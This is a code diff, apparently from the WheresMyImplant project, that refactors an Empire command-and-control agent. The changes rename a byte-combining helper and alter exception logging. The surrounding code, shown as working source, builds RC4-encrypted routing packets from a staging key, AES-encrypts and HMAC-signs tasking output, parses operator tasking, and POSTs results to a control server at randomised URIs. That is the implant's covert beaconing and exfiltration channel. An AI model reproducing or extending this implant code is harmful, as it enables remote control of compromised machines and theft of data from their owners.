@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Collections.ObjectModel;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -10,6 +9,7 @@ using System.Text;
 using System.Threading;
 
 using WheresMyImplant;
+using MonkeyWorks;
 
 namespace Empire
 {
@@ -64,17 +64,17 @@ namespace Empire
             }
 
             byte[] data = Encoding.ASCII.GetBytes(sessionId);
-            data = Misc.Combine(data, new byte[4] { 0x01, Convert.ToByte(meta), 0x00, 0x00 });
-            data = Misc.Combine(data, BitConverter.GetBytes(encryptedBytesLength));
+            data = Combine.combine(data, new byte[4] { 0x01, Convert.ToByte(meta), 0x00, 0x00 });
+            data = Combine.combine(data, BitConverter.GetBytes(encryptedBytesLength));
 
             byte[] initializationVector = newInitializationVector(4);
-            byte[] rc4Key = Misc.Combine(initializationVector, stagingKeyBytes);
+            byte[] rc4Key = Combine.combine(initializationVector, stagingKeyBytes);
             byte[] routingPacketData = EmpireStager.rc4Encrypt(rc4Key, data);
 
-            routingPacketData = Misc.Combine(initializationVector, routingPacketData);
+            routingPacketData = Combine.combine(initializationVector, routingPacketData);
             if (encryptedBytes != null && encryptedBytes.Length > 0)
             {
-                routingPacketData = Misc.Combine(routingPacketData, encryptedBytes);
+                routingPacketData = Combine.combine(routingPacketData, encryptedBytes);
             }
 
             return routingPacketData;
@@ -97,7 +97,7 @@ namespace Empire
                 byte[] routingEncryptedData = packetData.Skip(4).Take(16).ToArray();
                 offset += 20;
 
-                byte[] rc4Key = Misc.Combine(routingInitializationVector, stagingKeyBytes);
+                byte[] rc4Key = Combine.combine(routingInitializationVector, stagingKeyBytes);
 
                 byte[] routingData = EmpireStager.rc4Encrypt(rc4Key, routingEncryptedData);
                 String packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
@@ -106,9 +106,9 @@ namespace Empire
                     byte language = routingPacket[8];
                     byte metaData = routingPacket[9];
                 }
-                catch (IndexOutOfRangeException error)
+                catch (IndexOutOfRangeException ex)
                 {
-                    WriteOutputBad(error.ToString());
+                    Console.WriteLine("[-] {0}", ex.Message);
                 }
                 byte[] extra = routingPacket.Skip(10).Take(2).ToArray();
                 UInt32 packetLength = BitConverter.ToUInt32(routingData, 12);
@@ -126,9 +126,9 @@ namespace Empire
                     {
                         processTaskingPackets(encryptedData);
                     }
-                    catch (Exception error)
+                    catch (Exception ex)
                     {
-                        WriteOutputBad(error.ToString());
+                        Console.WriteLine("[-] {0}", ex.Message);
                     }
                 }
             }
@@ -178,12 +178,12 @@ namespace Empire
                 ICryptoTransform encryptor = aesCrypto.CreateEncryptor();
                 encryptedBytes = encryptor.TransformFinalBlock(packets, 0, packets.Length);
             }
-            encryptedBytes = Misc.Combine(ivBytes, encryptedBytes);
+            encryptedBytes = Combine.combine(ivBytes, encryptedBytes);
 
             HMACSHA256 hmac = new HMACSHA256();
             hmac.Key = sessionKeyBytes;
             Byte[] hmacBytes = hmac.ComputeHash(encryptedBytes).Take(10).ToArray();
-            encryptedBytes = Misc.Combine(encryptedBytes, hmacBytes);
+            encryptedBytes = Combine.combine(encryptedBytes, hmacBytes);
 
             Byte[] routingPacket = newRoutingPacket(encryptedBytes, 5);
 
@@ -202,9 +202,9 @@ namespace Empire
                     String taskUri = taskURIs[random.Next(taskURIs.Length)];
                     Byte[] response = webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
                 }
-                catch (WebException error)
+                catch (WebException ex)
                 {
-                    WriteOutputBad(error.ToString());
+                    Console.WriteLine("[-] {0}", ex.Message);
                 }
             }
 
